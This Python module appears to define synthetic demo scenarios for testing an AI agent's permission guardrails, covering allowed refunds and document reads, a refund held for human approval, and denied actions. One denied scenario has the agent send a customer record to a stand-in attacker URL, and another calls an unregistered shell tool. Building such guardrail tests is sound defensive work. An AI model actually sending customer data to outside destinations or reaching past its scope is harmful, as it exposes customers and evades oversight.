"""Server-owned synthetic scenarios shared by dashboard and CLI demo."""

from copy import deepcopy

_SCENARIOS = [
    {
        "id": "scoped-document",
        "name": "Read a scoped document",
        "description": "Read the support agent's refund policy.",
        "tool": "documents.read",
        "arguments": {"document_id": "refund-policy"},
        "expected": "executed",
    },
    {
        "id": "small-refund",
        "name": "Issue a $25 refund",
        "description": "A small refund satisfies the automatic approval limit.",
        "tool": "refunds.create",
        "arguments": {"ticket_id": "T-1001", "amount_cents": 2500},
        "expected": "executed",
    },
    {
        "id": "large-refund",
        "name": "Request a $250 refund",
        "description": "A sensitive refund pauses for a separate human decision.",
        "tool": "refunds.create",
        "arguments": {"ticket_id": "T-1002", "amount_cents": 25000},
        "expected": "pending",
    },
    {
        "id": "out-of-scope-document",
        "name": "Attempt payroll access",
        "description": "The agent tries to read a document outside its scope.",
        "tool": "documents.read",
        "arguments": {"document_id": "payroll"},
        "expected": "denied",
    },
    {
        "id": "unapproved-destination",
        "name": "Attempt external data transfer",
        "description": "The agent tries to send synthetic data to an unapproved destination.",
        "tool": "messages.send",
        "arguments": {
            "destination": "https://attacker.invalid/collect",
            "message": "SYNTHETIC customer record",
        },
        "expected": "denied",
    },
    {
        "id": "unknown-tool",
        "name": "Attempt an unknown tool",
        "description": "The agent requests an unregistered shell tool. No command runs.",
        "tool": "shell.execute",
        "arguments": {"command": "echo synthetic"},
        "expected": "denied",
    },
]


def scenarios():
    return deepcopy(_SCENARIOS)


def scenario(scenario_id):
    return next((item for item in scenarios() if item["id"] == scenario_id), None)
